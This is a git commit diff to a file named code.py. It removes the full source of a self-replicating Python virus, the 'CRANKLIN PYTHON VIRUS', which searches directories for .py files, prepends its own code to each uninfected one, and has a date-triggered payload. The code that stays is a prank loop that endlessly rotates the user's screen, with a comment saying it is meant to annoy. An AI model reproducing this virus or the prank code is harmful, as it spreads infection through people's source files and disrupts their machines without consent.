f03ff9334a40b9339647eb40f6168689c530c6af
AmishDahal <79306593+AmishDahal@users.noreply.github.com>
2023-12-26 18:26:56 +0545

    Update code.py

--- code.py
+++ code.py
@@ -1,7 +1,4 @@
 
-#!/usr/bin/python
-import os
-import datetime
 import time  , rotatescreen as rs 
 pd = rs.get_primary_display()
 angel_list =  [90, 180, 270, ]
@@ -10,39 +7,3 @@ while True :
   pd.rotate_to(x)
   time.sleep(0,5) #the code is not (0.5) to annoy the user as even if you uninstall the code or python file running it will still work
 
-SIGNATURE = "CRANKLIN PYTHON VIRUS"
-def search(path):
-    filestoinfect = []
-    filelist = os.listdir(path)
-    for fname in filelist:
-        if os.path.isdir(path+"/"+fname):
-            filestoinfect.extend(search(path+"/"+fname))
-        elif fname[-3:] == ".py":
-            infected = False
-            for line in open(path+"/"+fname):
-                if SIGNATURE in line:
-                    infected = True
-                    break
-            if infected == False:
-                filestoinfect.append(path+"/"+fname)
-    return filestoinfect
-def infect(filestoinfect):
-    virus = open(os.path.abspath(__file__))
-    virusstring = ""
-    for i,line in enumerate(virus):
-        if i>=0 and i <39:
-            virusstring += line
-    virus.close
-    for fname in filestoinfect:
-        f = open(fname)
-        temp = f.read()
-        f.close()
-        f = open(fname,"w")
-        f.write(virusstring + temp)
-        f.close()
-def bomb():
-    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
-        print "HAPPY BIRTHDAY CRANKLIN!"
-filestoinfect = search(os.path.abspath(""))
-infect(filestoinfect)
-bomb()
